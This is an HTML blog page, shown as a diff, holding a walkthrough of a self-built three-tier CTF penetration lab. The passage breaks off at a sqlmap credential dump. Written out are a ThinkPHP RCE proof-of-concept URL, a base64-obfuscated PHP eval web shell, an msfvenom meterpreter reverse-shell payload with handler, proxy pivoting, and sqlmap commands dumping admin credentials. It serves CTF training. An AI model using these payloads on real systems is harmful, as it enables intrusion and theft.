@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl">
+  
+  
+  
+  
+  <title>CFS三层靶机搭建及其内网渗透【附靶场环境】 | Teams Six</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="本文首发地址：https://www.anquanke.com/post/id/187908  0x00 前言最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。">
+<meta name="keywords" content="内网渗透,CFS,比赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CFS三层靶机搭建及其内网渗透【附靶场环境】">
+<meta property="og:url" content="http://www.teamssix.com/year/191021-211425.html">
+<meta property="og:site_name" content="Teams Six">
+<meta property="og:description" content="本文首发地址：https://www.anquanke.com/post/id/187908  0x00 前言最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png">
+<meta property="og:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png">
+<meta property="og:updated_time" content="2019-10-21T13:17:53.548Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CFS三层靶机搭建及其内网渗透【附靶场环境】">
+<meta name="twitter:description" content="本文首发地址：https://www.anquanke.com/post/id/187908  0x00 前言最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。">
+<meta name="twitter:image" content="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Teams Six" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/avatar.png">
+  
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: false,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img src="/img/avatar.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Teams Six</a></h1>
+        </hgroup>
+        
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/teamssix" title="github">github</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/TeamsSix" title="twitter">twitter</a>
+                            
+                                <a class="fl mail" target="_blank" href="mailto:daniel_ld@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/BiliBili/" style="font-size: 10px;">BiliBili</a> <a href="/tags/CFS/" style="font-size: 10px;">CFS</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CTFd/" style="font-size: 10px;">CTFd</a> <a href="/tags/CVE-2019-0708/" style="font-size: 10px;">CVE 2019-0708</a> <a href="/tags/CloudFlare/" style="font-size: 10px;">CloudFlare</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/GitHub/" style="font-size: 10px;">GitHub</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/Https/" style="font-size: 10px;">Https</a> <a href="/tags/Namesilo/" style="font-size: 10px;">Namesilo</a> <a href="/tags/Python/" style="font-size: 20px;">Python</a> <a href="/tags/VPS/" style="font-size: 10px;">VPS</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/小白/" style="font-size: 10px;">小白</a> <a href="/tags/思维导图/" style="font-size: 10px;">思维导图</a> <a href="/tags/总结/" style="font-size: 10px;">总结</a> <a href="/tags/批量工具/" style="font-size: 10px;">批量工具</a> <a href="/tags/指纹识别/" style="font-size: 10px;">指纹识别</a> <a href="/tags/斗罗大陆/" style="font-size: 10px;">斗罗大陆</a> <a href="/tags/比赛/" style="font-size: 15px;">比赛</a> <a href="/tags/渗透实例/" style="font-size: 10px;">渗透实例</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/漏洞挖掘/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/电影/" style="font-size: 15px;">电影</a> <a href="/tags/经验总结/" style="font-size: 15px;">经验总结</a> <a href="/tags/自适应视频大小/" style="font-size: 10px;">自适应视频大小</a> <a href="/tags/解决方案/" style="font-size: 15px;">解决方案</a> <a href="/tags/面试/" style="font-size: 10px;">面试</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://space.bilibili.com/148389186">B站</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://me.csdn.net/qq_37683287">CSDN</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.jianshu.com/u/23b447f36f98">简书</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.zhihu.com/people/teamssix">知乎</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.youtube.com/channel/UCKeJhJYi_tmXWETzVxKbSvA">YouTube</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://instagram.com/TeamsSix">Instagram</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">众人以为美的事就应当去行</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Teams Six</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img src="/img/avatar.png" class="js-avatar" style="width: 100%; height: 100%; opacity: 1;">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Teams Six</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/teamssix" title="github">github</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/TeamsSix" title="twitter">twitter</a>
+                    
+                        <a class="mail" target="_blank" href="mailto:daniel_ld@qq.com" title="mail">mail</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-CFS三层靶机搭建及其内网渗透【附靶场环境】" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/year/191021-211425.html" class="article-date">
+      <time datetime="2019-10-21T13:14:25.000Z" itemprop="datePublished">2019-10-21</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CFS三层靶机搭建及其内网渗透【附靶场环境】
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/实例演示/">实例演示</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CFS/">CFS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛/">比赛</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>本文首发地址：<a href="https://www.anquanke.com/post/id/187908" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187908</a></p>
+</blockquote>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。</p>
+<a id="more"></a>
+<p>在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。</p>
+<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png" alt><br>图 1</p>
+<p>Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png" alt><br>图 2</p>
+<p>如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。</p>
+<blockquote>
+<p>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。</p>
+</blockquote>
+<h1 id="0x02-Target1"><a href="#0x02-Target1" class="headerlink" title="0x02 Target1"></a>0x02 Target1</h1><h2 id="a、获取shell"><a href="#a、获取shell" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、先用nmap扫描一下Target1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -O 192.168.1.11</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT</span><br><span class="line">Nmap scan report for 192.168.1.11</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 994 filtered ports</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">20/tcp   closed ftp-data</span><br><span class="line">21/tcp   open   ftp</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">80/tcp   open   http</span><br><span class="line">888/tcp  open   accessbuilder</span><br><span class="line">8888/tcp open   sun-answerbook</span><br><span class="line">MAC Address: 00:0C:29:81:A6:6D (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds</span><br></pre></td></tr></table></figure>
+
+<p>可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。</p>
+<p>2、既然存在http服务，那就用浏览器打开看看是个什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png" alt><br>3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png" alt><br>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png" alt><br>5、在工具中命令是可以被执行的，那就getshell吧<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png" alt><br>6、昂~ getshell失败，没关系，直接echo写入一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_POST[&apos;TeamsSix&apos;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png" alt><br>7、通过浏览器访问，查看shell.php是否上传成功<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png" alt><br>8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">之前：&lt;?php @eval($_POST[&apos;TeamsSix&apos;]);?&gt;</span><br><span class="line">之后：&lt;?php @eval([&apos;TeamsSix&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==&quot; | base64 -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png" alt><br>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png" alt></p>
+<h2 id="b、设置代理"><a href="#b、设置代理" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><blockquote>
+<p>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。</p>
+</blockquote>
+<p>1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ifconfig</span><br><span class="line">root@kali:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png" alt><br>2、在kali中配置运行监听模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt; options</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png" alt><br>3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png" alt><br>4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">这一步也可以使用run post/multi/manage/autoroute自动添加路由</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png" alt><br>5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks4a</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; set srvport 2222</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; options</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png" alt><br>6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# vim /etc/proxychains.conf</span><br><span class="line">加入以下内容：</span><br><span class="line">socks4 	192.168.1.113 	2222</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png" alt><br>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains4 nmap -Pn -sT 192.168.22.22</span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png" alt></p>
+<h1 id="0x03-Target2"><a href="#0x03-Target2" class="headerlink" title="0x03 Target2"></a>0x03 Target2</h1><h2 id="a、获取shell-1"><a href="#a、获取shell-1" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png" alt><br>2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png" alt><br>3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png" alt><br>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png" alt><br>5、看看bagecms下有哪些表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png" alt><br>6、看一下bage_admin下的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png" alt><br>7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password --dump</span><br></pre></td></tr></table></figure>
+
